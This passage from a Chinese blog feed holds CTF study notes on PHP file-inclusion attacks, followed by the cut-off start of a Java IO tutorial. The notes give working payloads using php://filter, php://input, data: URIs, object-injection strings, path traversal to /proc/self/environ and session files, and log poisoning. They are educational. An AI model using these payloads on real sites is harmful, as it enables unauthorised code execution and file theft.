<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt; <span class="title function_ invoke__">phpinfo</span>();&lt;/script&gt;</span><br><span class="line"><span class="meta">&lt;?</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line">&lt;% <span class="title function_ invoke__">phpinfo</span>();%&gt;</span><br></pre></td></tr></table></figure>
<p>此处例1和例2都是可用，而例3需要在<strong>PHP.ini</strong>中打开<strong>short-open-tag</strong>，但它在PHP5.4之后就总是可用了无需启用再<strong>short-open-tag</strong>，例4需要启用的是<strong>asp-tags</strong>。</p>
<h4 id="x02-flag在index里">0x02 <a
href="http://120.24.86.145:8005/post/">Flag在Index里</a></h4>
<p><strong>BugKu</strong>的一道题。</p>
<p><strong>click</strong>点完并没有什么收获，而题目提示<strong>Flag</strong>在<strong>Index</strong>里面，但是无法通过查看源码得到有效信息，因此尝试使用<strong>php://filter</strong>获取源码。</p>
<p><strong>payload</strong>为<strong>?file=php://filter/convert.base64-encode/resource=index.php</strong>。</p>
<p>得到<strong>flag{edulcni_elif_lacol_si_siht}</strong>。</p>
<p>此处使用的<strong>php://filter</strong>涉及到<a
href="http://php.net/manual/zh/wrappers.php.php">PHP伪协议</a>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resource=&lt;要过滤的数据流&gt;      </span><br><span class="line">这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read=&lt;读链的筛选列表&gt;          </span><br><span class="line">该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write=&lt;写链的筛选列表&gt;         </span><br><span class="line">该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;           </span><br><span class="line">任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure>
<p>过滤数据流中，过滤器有很多种，有字符串过滤器、转换过滤器、压缩过滤器、加密过滤器。</p>
<h5 id="字符串过滤器">字符串过滤器</h5>
<ul>
<li><strong>string.rot13 //</strong>进行<strong>rot13</strong>转换</li>
<li><strong>string.toupper //</strong>将字符全部大写</li>
<li><strong>string.tolower //</strong>将字符全部小写</li>
<li><strong>string.strip_tags
//</strong>去除空字符、<strong>HTML</strong>和<strong>PHP</strong>标记后的结果</li>
</ul>
<h5 id="转换过滤器">转换过滤器</h5>
<ul>
<li><strong>convert.base64-encode
//</strong>相当于使用<strong>base64_encode()</strong>处理所有流数据</li>
<li><strong>convert.base64-decode
//</strong>相当于使用<strong>base64_decode()</strong>处理所有流数据</li>
<li><strong>convert.quoted-printable-encode //</strong>无对应函数</li>
<li><strong>convert.quoted-printable-decode
//</strong>相当于使用<strong>quoted_printable_decode()</strong>处理所有流数据</li>
</ul>
<h5 id="压缩过滤器">压缩过滤器</h5>
<ul>
<li><strong>zlib.deflate</strong></li>
<li><strong>zlib.inflate</strong></li>
<li><strong>bzip2.compress</strong></li>
<li><strong>bzip2.decompress</strong></li>
</ul>
<h5 id="加密过滤器">加密过滤器</h5>
<p><strong>mcrypt</strong>和<strong>mdecrypt</strong>使用<strong>libmcrypt</strong>提供了对称的加密和解密。这两组过滤器都支持
<strong>mcrypt</strong>扩展库中相同的算法，格式为<strong>mcrypt.ciphername</strong>，其中<strong>ciphername</strong>是密码的名字，将被传递给<strong>mcrypt_module_open()</strong>。有以下五个过滤器参数可用：</p>
<table>
<colgroup>
<col style="width: 13%" />
<col style="width: 7%" />
<col style="width: 31%" />
<col style="width: 47%" />
</colgroup>
<thead>
<tr class="header">
<th>参数</th>
<th>是否必须</th>
<th>默认值</th>
<th>取值举例</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>mode</td>
<td>可选</td>
<td>cbc</td>
<td>cbc, cfb, ecb, nofb, ofb, stream</td>
</tr>
<tr class="even">
<td>algorithms_dir</td>
<td>可选</td>
<td>ini_get('mcrypt.algorithms_dir')</td>
<td>algorithms 模块的目录</td>
</tr>
<tr class="odd">
<td>modes_dir</td>
<td>可选</td>
<td>ini_get('mcrypt.modes_dir')</td>
<td>modes 模块的目录</td>
</tr>
<tr class="even">
<td>iv</td>
<td>必须</td>
<td>N/A</td>
<td>典型为 8，16 或 32 字节的二进制数据。根据密码而定</td>
</tr>
<tr class="odd">
<td>key</td>
<td>必须</td>
<td>N/A</td>
<td>典型为 8，16 或 32 字节的二进制数据。根据密码而定</td>
</tr>
</tbody>
</table>
<h4 id="x03-welcome-to-bugkuctf">0x03 <a
href="http://120.24.86.145:8006/test1/">welcome to bugkuctf</a></h4>
<p><strong>BugKu</strong>的一道题，源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--  </span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>];  </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$user</span>)&amp;&amp;(file_get_cont	<span class="title function_ invoke__">ents</span>(<span class="variable">$user</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the bugkuctf&quot;</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello admin!&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not admin ! &quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">--&gt;  </span><br></pre></td></tr></table></figure>
<p>此处有三点注意：</p>
<ol type="1">
<li><strong>isset($user)</strong>这里必须要传入这个<strong>user</strong>变量。</li>
<li><strong>file_get_contents</strong>作用是把文件读入字符串，此处这句话就是把<strong>user</strong>文件读出来的内容需要是<strong>welcome
to the bugkuctf</strong>。</li>
<li><strong>include($file);
//hint.php</strong>提示以上条件满足后读取<strong>hint.php</strong>文件。</li>
</ol>
<p>而此处为了满足第二个条件则需要使用到<strong>php://input</strong>这个<a
href="http://php.net/manual/zh/wrappers.php.php"><strong>PHP</strong>伪协议</a>【详细作用就是传进去的参数在作为文件打开的时候，通过<strong>Post</strong>方式传入的值就作为文件的内容。</p>
<p>因此构造的<strong>payload</strong>为<strong>?txt=php://input</strong>，再<strong>Post</strong>传入<strong>welcome
to the bugkuctf</strong>就可以看到回显，不过为什么是<strong>hello
friend!</strong>【雾。</p>
<p>这个时候显然还不能拿到flag，再结合上面第三点的<strong>include($file);
//hint.php</strong>，这是可以使用<strong>php://filter</strong>伪协议来读出<strong>hint.php</strong>的内容。</p>
<p>所以构造<strong>?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php</strong>。</p>
<p>得到了<strong>hint.php</strong>源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> (<span class="string">&quot;good&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
<p>有丶激动，于是直接读了<strong>flag.php</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸èƒ½çŽ°åœ¨å°±ç»™ä½ flagå“¦</span><br></pre></td></tr></table></figure>
<p>什么乱七八糟的【雾。</p>
<p>那再读一下<strong>index.php</strong>的源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$txt</span> = <span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>];  </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$txt</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$txt</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the bugkuctf&quot;</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello friend!&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123; </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;不能现在就给你flag哦&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);   </span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not the number of bugku ! &quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line">  </span><br><span class="line">&lt;!--  </span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>];  </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$user</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$user</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the bugkuctf&quot;</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello admin!&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not admin ! &quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;  </span><br></pre></td></tr></table></figure>
<p>这里可以从第八行开始看到如果之前尝试读<strong>flag</strong>就会被那个<strong>preg_match</strong>直接给<strong>exit</strong>掉。</p>
<p>但十三行给了一个重要的信息是<strong>unserialize</strong>函数，大意是说若传入的<strong>file</strong>参数不含<strong>flag</strong>字符串的话就把它包含进来，并且序列化<strong>password</strong>参数。</p>
<p>而<strong>flag.php</strong>则大意是若<strong>file</strong>传参进来的文件存在则输出该文件。</p>
<p>那么现在的解决方案就是构造读取<strong>flag.php</strong>的代码并将其序列化后的值传给<strong>password</strong>执行。</p>
<p>由于对序列化这一块还不是很熟所以抄了一下作业<strong>XD</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">  </span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();  </span><br><span class="line">    <span class="variable">$a</span>-&gt;file = <span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);  </span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
<p>得到序列化后的值是<strong>O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</strong>
。</p>
<p>最终的<strong>payload</strong>是<strong>?txt=php://input&amp;file=hint.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</strong>。</p>
<p>得到<strong>flag</strong>是<strong>flag{php_is_the_best_language}</strong>。</p>
<h4 id="x04-level-3--double-agent">0x04 <a
href="http://level3.tasteless.eu/">Level 3- Double Agent</a></h4>
<p>这题来自<strong>Tasteless CTF</strong>。</p>
<p>源码如下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">view file: php.ini</span></span><br><span class="line"><span class="comment">so here is my hint: the included php.ini file is part of the configugartion file used on the server the bug was found.</span></span><br><span class="line"><span class="comment">so there will be something in it which enables you to solve this level, wont?</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">always be UP TO DATE!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">hint enough, might just take you seconds to do?!</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;anti_rfi.php&#x27;</span>); <span class="comment">//rfi is forbidden!!!!!</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$inc</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">@<span class="keyword">require_once</span>(<span class="variable">$inc</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>此处有几个提示，一是说禁止了<strong>RFI</strong>，另一个是说在<strong>PHP.ini</strong>中有敏感信息。</p>
<p>打开会看到一个<strong>allow_url_include=On</strong>表名此处可以使用<a
href="http://php.net/manual/zh/wrappers.php.php">PHP伪协议</a>【仅
<strong>php://input、
php://stdin、php://memory和php://temp</strong>，而<strong>enctype="multipart/form-data"</strong>时则无法使用<strong>php://input</strong>。</p>
<p>而<strong>allow_url_fopen=Off</strong>则表明无法进行远程读取，即使用菜刀连接。</p>
<p>构造<strong>?file=php://input</strong>后尝试<strong>Post</strong>如下数据来获取更多信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
<p>这里可以得到一个<strong>Web</strong>服务的路径为<strong>/var/www/chall/level3</strong>。</p>
<p>那么现在使用一个<strong>scandir()</strong>函数来获取目录下的文件名。</p>
<p>构造<strong>?file=php://input</strong>后<strong>Post</strong>一个数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php print_r(scandir(&#x27;/var/www/chall/level3&#x27;));?&gt;</span><br></pre></td></tr></table></figure>
<p>就能看到<strong>flag</strong>文件存放的位置了。</p>
<h4 id="x05-利用procselfenviron">0x05 <a
href="https://lalajun.github.io/2018/03/19/WEB-LFI%E4%B8%8ERFI%E5%88%A9%E7%94%A8/#proc-self-environ">利用/proc/self/environ</a></h4>
<p>接下来的一些是找不到例题的我只好抱着别人的博客慢慢啃的XD。</p>
<p><strong>/proc/self/environ</strong>是当前正在运行的进程的环境变量列表。假设这时有一个不做过滤的<strong>index.php</strong>，且<strong>/proc/self/environ</strong>有读写权限。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;$file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>那么此处抓包修改<strong>http</strong>请求头可以发现访问<strong>?file=../../../../../../../../proc/self/environ</strong>的时候该文件内容有所改变，那么这个时候就可以构造恶意的代码在<strong>http</strong>请求头中，从而读写该文件。</p>
<h4 id="x06-利用日志文件污染">0x06 <a
href="https://lalajun.github.io/2018/03/19/WEB-LFI%E4%B8%8ERFI%E5%88%A9%E7%94%A8/#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%B1%A1%E6%9F%93">利用日志文件污染</a></h4>
<p>通常，访问目标系统上的某些对外开放的服务时，系统会自动将访问记录写入到日志文件中，利用这个机制，有可能会将代码写入到日志中。</p>
<p>此操作的前提通常需要做到以下三点。</p>
<ol type="1">
<li><p>找到日志文件，并且<strong>有访问和执行权限</strong>【包括所有上级目录访问和执行权限。</p></li>
<li><p>nc提交木马至对方端口，会被写入对方的日志文件。</p></li>
<li><p>包含日志文件执行代码。</p></li>
</ol>
<p>一般日志文件的路径如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/log/apache/access_log</span><br><span class="line">/var/www/logs/access_log</span><br><span class="line">/var/log/access_log</span><br><span class="line">/var/log/apache2/access.log</span><br></pre></td></tr></table></figure>
<h4 id="x07-包含session文件">0x07 <a
href="https://lalajun.github.io/2018/03/19/WEB-LFI%E4%B8%8ERFI%E5%88%A9%E7%94%A8/#%E5%8C%85%E5%90%ABSESSION%E6%96%87%E4%BB%B6">包含SESSION文件</a></h4>
<p>session文件格式为<strong>sess_[phpsessid]</strong>，<strong>phpsessid</strong>作为<strong>cookie</strong>传递，在服务端文件位置会变化。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">默认位置</span><br><span class="line">/tmp/(PHP Sessions)</span><br><span class="line">也可能</span><br><span class="line">/var/lib/php/session/(PHP Sessions)</span><br><span class="line">/var/lib/php5/(PHP Sessions)</span><br><span class="line">c:/windows/temp/(PHP Sessions)等文件中。</span><br></pre></td></tr></table></figure>
<p>尝试读取<strong>session</strong>文件<strong>?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7</strong>。
在某些特定的情况下如果你能够控制<strong>session</strong>的值，也许能够获得一个<strong>shell</strong>。</p>
<h3 id="rfi远程文件包含">RFI【远程文件包含</h3>
<h4
id="当allow_url_fopenon与allow_url_includeon时">当allow_url_fopen=On与allow_url_include=On时</h4>
<p>这个时候应当是最简单最容易理解的<strong>RFI</strong>了。</p>
<p>假设现在对象文件是<strong>index.php</strong>，代码如下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以直接构造<strong>url=http://localhost/phpinfo.php</strong>这样进行攻击。</p>
<p>另外还有一种方法是<a
href="http://www.php.net/manual/zh/wrappers.data.php"><strong>data：</strong></a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url=data:text/plain,<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>()<span class="meta">?&gt;</span></span><br><span class="line">url=data:text/plain,<span class="meta">&lt;?php</span> <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(“.”));<span class="meta">?&gt;</span></span><br><span class="line">url=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>
<h4
id="当allow_url_fopenon与allow_url_includeoff时">当allow_url_fopen=On与allow_url_include=Off时</h4>
<p>这个时候只能进行远程文件打开，如同全<strong>On</strong>的第一条一样。</p>
<h4
id="当allow_url_fopenoff与allow_url_includeon时">当allow_url_fopen=Off与allow_url_include=On时</h4>
<p>这个时候只能使用一些伪协议如<strong>php://input</strong>、<strong>php://stdin</strong>、<strong>php://memory</strong>和<strong>php://temp</strong>等来进行攻击。</p>
<p>例如可以使用<strong>php://input</strong>，来执行同时<strong>post</strong>过去的恶意代码。</p>
<h3 id="防御方法">防御方法</h3>
<ol type="1">
<li><p>访问权限要有控制。</p></li>
<li><p>使用白名单验证被访问的文件。</p></li>
<li><p>过滤<strong>../</strong>这样的传入参数。</p></li>
</ol>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
        <tag>文件包含</tag>
        <tag>Web安全修炼计划</tag>
      </tags>
  </entry>
  <entry>
    <title>复习Java的IO相关</title>
    <url>/Study-Java-IO/</url>
    <content><![CDATA[<p>。这下从零开始了。</p>
<span id="more"></span>
<h1 id="流式-io">流式 IO</h1>
<p>编程语言的 <strong>IO</strong>
类库经常使用<strong>流</strong>这个抽象概念，它将所有数据源或者数据接收器表示为能够产生或者接收数据片的对象。</p>
<p>所有与输入有关的类都继承于 <strong>InputStream</strong>，因此从
<strong>InputStream</strong> 或 <strong>Reader</strong>
派生而来的类都含有名为 <strong>read()</strong>
的基本方法，用于读取单个字节或者字节数组。而所有与输出有关的类也类似，故不再赘述。</p>
<blockquote>
<p><strong>InputStream</strong>：读出 <strong>Byte</strong>
数组，是字节流，数据按八位一组。</p>
<p><strong>Reader</strong>：读出 <strong>Char</strong> 数组或
<strong>String</strong>，是字符流，数据按相对应的编码分组，比如Unicode。</p>
<p><strong>Reader</strong> 的存在主要是为了国际化。老的
<strong>IO</strong> 流仅支持 <strong>8</strong>
比特的字节流，并且不能很好地处理 <strong>16</strong> 比特的
<strong>Unicode</strong> 字符。新的设计也使得它更快。</p>
</blockquote>
<p>而实际使用中很少使用单一的类来创建流对象，而是通过叠合多个
<strong>IO</strong> 类【装饰器设计模式】。</p>
<h2 id="数据源">数据源</h2>
<p><strong>IO</strong> 可以连接到如下数据源：</p>
<ol type="1">
<li>字节数组；</li>
<li><strong>String</strong> 对象；</li>
<li>文件；</li>
<li>管道；</li>
<li>一个由其它种类的流组成的序列；</li>
<li>对象；</li>
<li>其它数据源，如 <strong>Internet</strong> 连接；</li>
</ol>
<h2
id="fileinputstreamfileoutputstream">FileInputStream/FileOutputStream</h2>
<p>构造器传参有文件路径、 <strong>File</strong> 对象和
<strong>FileDescriptor</strong> 对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 向上转型，分场合使用，可以使代码简洁</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/tmp/out1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// read() 方法返回的是字节对应的编码，8位一组</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">data</span> <span class="operator">=</span> inputStream.read();</span><br><span class="line">        <span class="keyword">while</span> (data != -<span class="number">1</span>) &#123;</span><br><span class="line">            System.out.print(data + <span class="string">&quot; &quot;</span>);</span><br><span class="line">            data = inputStream.read();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 229 141 151 230 186 159 10</span></span><br><span class="line">        inputStream.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;/tmp/out1.txt&quot;</span>);</span><br><span class="line">        outputStream.write(<span class="string">&quot;南溟&quot;</span>.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2
id="bytearrayinputstreambytearrayoutputstream">ByteArrayInputStream/ByteArrayOutputStream</h2>
<p><strong>ByteArrayInputStream</strong> 和
<strong>ByteArrayOutputStream</strong>
是在内存中创建缓冲区，缓冲区会随着数据的不断写入而自动增长。</p>
<p>类中的方法在关闭此流后仍可被调用，而不会产生任何
<strong>IOException</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(<span class="string">&quot;南溟&quot;</span>.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        <span class="type">int</span> <span class="variable">data</span> <span class="operator">=</span> input.read();</span><br><span class="line">        <span class="keyword">while</span> (data != -<span class="number">1</span>) &#123;</span><br><span class="line">            System.out.print(data + <span class="string">&quot; &quot;</span>);</span><br><span class="line">            data = input.read();</span><br><span class="line">        &#125;</span><br><span class="line">        input.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        output.write(<span class="string">&quot;南溟&quot;</span>.getBytes());</span><br><span class="line">        output.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2
id="pipedinputstreampipedoutputstream">PipedInputStream/PipedOutputStream</h2>
<p>这两个类使得程序可以通过管道进行线程间的通讯。</p>
<p>使用两个已连接的管道流时，要为每个流操作创建一个线程。</p>
<p>因为 <strong>read()</strong> 和 write()
都是阻塞方法，如果一个线程同时读写就会造成死锁。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">PipedOutputStream</span> <span class="variable">pipedOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PipedOutputStream</span>();</span><br><span class="line">        <span class="type">PipedInputStream</span> <span class="variable">pipedInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PipedInputStream</span>(pipedOutputStream, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="string">&quot;1234567890&quot;</span>;</span><br><span class="line">                    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                        pipedOutputStream.write(data.getBytes());</span><br><span class="line">                        pipedOutputStream.flush();</span><br><span class="line">                        System.out.println(<span class="string">&quot;pipedOutputStream.write &quot;</span> + data);</span><br><span class="line">                        Thread.sleep(<span class="number">10000</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    System.out.println(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread1.start();</span><br><span class="line"></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                        